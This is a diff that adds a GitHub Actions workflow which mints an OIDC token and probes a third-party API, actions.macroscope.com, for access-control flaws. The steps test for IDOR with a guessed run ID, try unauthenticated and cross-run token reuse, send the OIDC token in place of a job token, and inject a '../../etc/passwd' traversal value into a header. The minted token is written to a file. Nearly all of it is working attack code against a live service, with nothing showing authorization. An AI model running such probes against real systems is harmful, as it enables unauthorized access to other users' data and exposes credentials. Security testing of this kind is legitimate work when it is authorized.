@@ -1,0 +1,78 @@
+name: oidc-probe2
+on:
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  run-matrix:
+    runs-on: [self-hosted, probe]
+    steps:
+      - uses: actions/checkout@v4
+      - name: Mint token and run POST+GET matrix
+        shell: bash
+        run: |
+          set -x
+          token=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=macroscope" | jq -r .value)
+          echo "$token" > token2.txt
+          sha=$(git rev-parse HEAD)
+          echo "SHA=$sha"
+          # 1. baseline POST (agent probe exists now) -> expect 202 runId+jobToken
+          curl -sS -X POST https://actions.macroscope.com/api/v1/github-actions/agent-runs \
+            -H "Authorization: Bearer $token" -H "X-Macroscope-Action-Version: v1" \
+            -H "Content-Type: application/json" \
+            -d "{\"repository\":\"$GITHUB_REPOSITORY\",\"agent\":\"probe\",\"commit\":\"$sha\"}" \
+            -w "\n__HTTP_STATUS:%{http_code}\n" > resp-create-run.txt
+          echo "CREATE_RUN:"; cat resp-create-run.txt
+          runid=$(jq -r '.runId // empty' resp-create-run.txt)
+          jobtok=$(jq -r '.jobToken // empty' resp-create-run.txt)
+          echo "RUNID=$runid JOBTOK_LEN=${#jobtok}"
+          # 2. GET own run with own jobToken
+          curl -sS "https://actions.macroscope.com/api/v1/github-actions/agent-runs/$runid" \
+            -H "Authorization: Bearer $jobtok" -H "X-Macroscope-Action-Version: v1" \
+            -w "\n__HTTP_STATUS:%{http_code}\n" > resp-get-own.txt
+          echo "GET_OWN:"; cat resp-get-own.txt
+          # 3. GET random UUID with own jobToken (IDOR probe)
+          curl -sS "https://actions.macroscope.com/api/v1/github-actions/agent-runs/11111111-2222-4333-8444-555566667777" \
+            -H "Authorization: Bearer $jobtok" -H "X-Macroscope-Action-Version: v1" \
+            -w "\n__HTTP_STATUS:%{http_code}\n" > resp-get-other-id.txt
+          echo "GET_OTHER_ID:"; cat resp-get-other-id.txt
+          # 4. GET own run WITHOUT token
+          curl -sS "https://actions.macroscope.com/api/v1/github-actions/agent-runs/$runid" \
+            -w "\n__HTTP_STATUS:%{http_code}\n" > resp-get-notoken.txt
+          echo "GET_NO_TOKEN:"; cat resp-get-notoken.txt
+          # 5. GET own run with OIDC token instead of jobToken
+          curl -sS "https://actions.macroscope.com/api/v1/github-actions/agent-runs/$runid" \
+            -H "Authorization: Bearer $token" -H "X-Macroscope-Action-Version: v1" \
+            -w "\n__HTTP_STATUS:%{http_code}\n" > resp-get-oidctoken.txt
+          echo "GET_OIDC_TOKEN:"; cat resp-get-oidctoken.txt
+          # 6. POST second run
+          curl -sS -X POST https://actions.macroscope.com/api/v1/github-actions/agent-runs \
+            -H "Authorization: Bearer $token" -H "X-Macroscope-Action-Version: v1" \
+            -H "Content-Type: application/json" \
+            -d "{\"repository\":\"$GITHUB_REPOSITORY\",\"agent\":\"probe\",\"commit\":\"$sha\"}" \
+            -w "\n__HTTP_STATUS:%{http_code}\n" > resp-create-run2.txt
+          echo "CREATE_RUN2:"; cat resp-create-run2.txt
+          runid2=$(jq -r '.runId // empty' resp-create-run2.txt)
+          jobtok2=$(jq -r '.jobToken // empty' resp-create-run2.txt)
+          # 7. cross-run tokens
+          curl -sS "https://actions.macroscope.com/api/v1/github-actions/agent-runs/$runid2" \
+            -H "Authorization: Bearer $jobtok" -H "X-Macroscope-Action-Version: v1" \
+            -w "\n__HTTP_STATUS:%{http_code}\n" > resp-get-cross-a.txt
+          echo "GET_CROSS_A (tok1->run2):"; cat resp-get-cross-a.txt
+          curl -sS "https://actions.macroscope.com/api/v1/github-actions/agent-runs/$runid" \
+            -H "Authorization: Bearer $jobtok2" -H "X-Macroscope-Action-Version: v1" \
+            -w "\n__HTTP_STATUS:%{http_code}\n" > resp-get-cross-b.txt
+          echo "GET_CROSS_B (tok2->run1):"; cat resp-get-cross-b.txt
+          # 8. version header variants on GET own run
+          curl -sS "https://actions.macroscope.com/api/v1/github-actions/agent-runs/$runid" \
+            -H "Authorization: Bearer $jobtok" \
+            -w "\n__HTTP_STATUS:%{http_code}\n" > resp-get-nover.txt
+          echo "GET_NO_VERSION_HEADER:"; cat resp-get-nover.txt
+          curl -sS "https://actions.macroscope.com/api/v1/github-actions/agent-runs/$runid" \
+            -H "Authorization: Bearer $jobtok" -H "X-Macroscope-Action-Version: ../../etc/passwd" \
+            -w "\n__HTTP_STATUS:%{http_code}\n" > resp-get-badver.txt
+          echo "GET_BAD_VERSION_HEADER:"; cat resp-get-badver.txt
+          ls -la resp-*.txt token2.txt
